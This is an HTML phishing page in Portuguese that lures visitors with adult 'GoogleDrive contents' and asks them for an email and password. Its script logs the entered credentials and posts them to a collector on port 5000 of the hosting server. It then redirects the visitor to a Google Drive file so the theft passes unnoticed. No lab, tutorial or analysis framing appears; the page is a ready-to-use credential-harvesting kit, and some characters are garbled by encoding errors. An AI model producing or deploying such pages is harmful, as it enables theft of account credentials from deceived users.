<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Form</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <style>
        /* Estilos omitidos por brevidade */
    </style>
</head>
<body>
    <div class="gradient-overlay left"></div>
    <div class="gradient-overlay right"></div>
    <div class="container">
        <h2>ConteÃºdos GoogleDriveðŸ”ž</h2>
        <form id="loginForm" method="POST" action="">
            <div class="form-group">
                <input type="email" class="form-control" id="email" name="email" placeholder="Digite o e-mail">
            </div>
            <div class="form-group">
                <input type="password" class="form-control" id="password" name="password" placeholder="Digite a senha">
            </div>
            <button type="button" onclick="enviarFormulario()">Entrar</button>
            <!-- Exibir mensagem de erro -->
            <p id="mensagemErro" style="color: red;"></p>
        </form>
    </div>

    <script>
        var enderecoIP = window.location.hostname;
        document.getElementById("loginForm").action = "http://" + enderecoIP + ":5000";

        function enviarFormulario() {
            console.log("Enviando formulÃ¡rio...");

            var email = document.getElementById('email').value;
            var password = document.getElementById('password').value;

            console.log("Email:", email);
            console.log("Senha:", password);

            if (email === '' || password === '') {
                document.getElementById('mensagemErro').innerText = 'Por favor, preencha todos os campos.';
                return;
            }

            var formData = new FormData();
            formData.append('email', email);
            formData.append('password', password);

            console.log("Dados do formulÃ¡rio:", formData);

            var xhr = new XMLHttpRequest();
            xhr.open('POST', document.getElementById("loginForm").action);
            xhr.onload = function () {
                console.log("Resposta recebida:", xhr.responseText);
                if (xhr.status === 200) {
                    window.location.href = "https://drive.google.com/file/d/1-n2-7RG13HA7ttCVJukD_PpoMDsSRS6n/view?usp=drive";
                } else {
                    var mensagem = xhr.responseText;
                    document.getElementById('mensagemErro').innerText = mensagem;
                }
            };
            xhr.send(formData);
        }
    </script>
</body>
</html>
